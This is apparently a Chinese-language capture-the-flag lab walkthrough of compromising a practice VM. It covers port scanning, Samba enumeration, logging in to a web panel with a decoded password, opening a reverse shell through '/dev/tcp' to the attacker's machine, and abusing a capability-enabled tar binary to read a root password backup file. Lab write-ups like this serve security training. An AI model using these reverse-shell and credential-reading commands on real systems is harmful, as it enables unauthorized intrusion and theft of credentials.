
# 0X00 环境
**攻击机：**192.168.1.37<br />**目标机：**192.168.1.10


# 0X01 信息收集
使用[NMAP](https://www.yuque.com/xmtxsec/network_security/xm1y1f)进行端口扫描
```
nmap -sV -A 192.168.1.10 -p-
```
![image.png](_img\06-靶场实践/1671763067854-9fc4c275-e35c-44f8-b67c-a92f7106f3b5.png)
通过扫描结果可以发现开放了五个端口分别是：80、139、445、10000、20000

80端口的页面就是一个Apache2 Debian的默认页面没啥信息，但是在源码有一串疑似加密的字符
![image.png](_img\06-靶场实践/1671763439409-ca1afe71-cc32-4fd0-9b0b-618adf8f8da7.png)

百度[解密](http://tool.bugku.com/brainfuck/?wafcloud=1)的到`.2uqPEfj3D<P'a-3`
![image.png](_img\06-靶场实践/1671763595229-c1f59582-7873-43a6-a291-d8c36d10a30f.png)

10000端口和20000端口都是登录页面上面得到的字符串可能是密码
![image.png](_img\06-靶场实践/1671763724842-93d6fc0a-1d33-4e4d-8dfb-13bff4b9a6cd.png)

在前面端口扫描中扫描出139和445端口是Samba服务，尝试用[enum4linux](https://www.yuque.com/xmtxsec/network_security/dld4wott34mzhboe)探测一下目标的Samba信息，成功得到账号`cyber`
```
enum4linux -a 192.168.1.10
```
![image.png](_img\06-靶场实践/1671765326782-dbf8c1b2-5bcc-4bc8-8f2c-13536e259881.png)

尝试将上面扫描出来的账号`cyber`和密码`.2uqPEfj3D<P'a-3`进行登录<br />在10000端口登录失败，在20000端口登录成功
![image.png](_img\06-靶场实践/1671765508763-48e25ac5-cba2-4a4a-b461-d31080a1334f.png)


# 0X02 漏洞发现
登陆后在页面探索发现在目录下面可以开启命令框可以执行命令
![image.png](_img\06-靶场实践/1671765641423-53487e36-3e66-4cd8-8251-5513264829e9.png)
![image.png](_img\06-靶场实践/1671765679927-4b39f542-cd45-4067-9bc3-71f4864e7cff.png)


# 0X03 漏洞利用
尝试反弹shell<br />攻击机开启监听
```
nc -lvp 6666
```

在靶机命令框执行以下命令
```
bash -i >& /dev/tcp/192.168.1.37/6666 0>&1
```
成功反弹shell
![image.png](_img\06-靶场实践/1671765968810-95c0beeb-8324-48e1-a77b-9b4521f60ac4.png)


# 0X04 提权 
查看当前用户所具有的权限
```
sudo -l
```
![image.png](_img\06-靶场实践/1671766112935-16226dcf-96c5-4dba-ba96-a88eba422d48.png)

 查找具有特殊权限SUID的文件，没什么可以利用的
```
find / -perm -u=s -type f 2>/dev/null
```
![image.png](_img\06-靶场实践/1671766310348-6976511e-41b5-4e38-b325-c1dbdf8e3d44.png)

在前面查看flag的时候目录下有一个tar文件，查看一下他的权限
```
ls -l tar
getcap tar
```
![image.png](_img\06-靶场实践/1671766796800-482d494f-20f8-449f-8573-6526c9f620ce.png)
这里可以看到tar具有root权限并且可以[读取任意文件](https://blog.csdn.net/megan_free/article/details/100357702)

经过查找发现在var/backups下的一个备份文件.old_pass.bak
![image.png](_img\06-靶场实践/1671767044584-28540eb8-d813-4e48-ac64-b7303d0173dc.png)

可以看到这个文件并没有执行权限，但是tar文件有执行权限，所以我们可以**把这个文件用tar压缩后再用系统的tar文件解压**，这样就没有权限问题
```
./tar -cvf passwd.tar /var/backups/.old_pass.bak 
tar -xvf passwd.tar
```
 ![image.png](_img\06-靶场实践/1671769120932-77eca096-ccf5-404f-a9e3-14441e7d665b.png)
得到密码`Ts&4&YurgtRX(=~h`

尝试登录root用户，成功得到flag
![image.png](_img\06-靶场实践/1671769446078-7cff4916-5eb8-4a73-91ed-936203ee88d4.png)





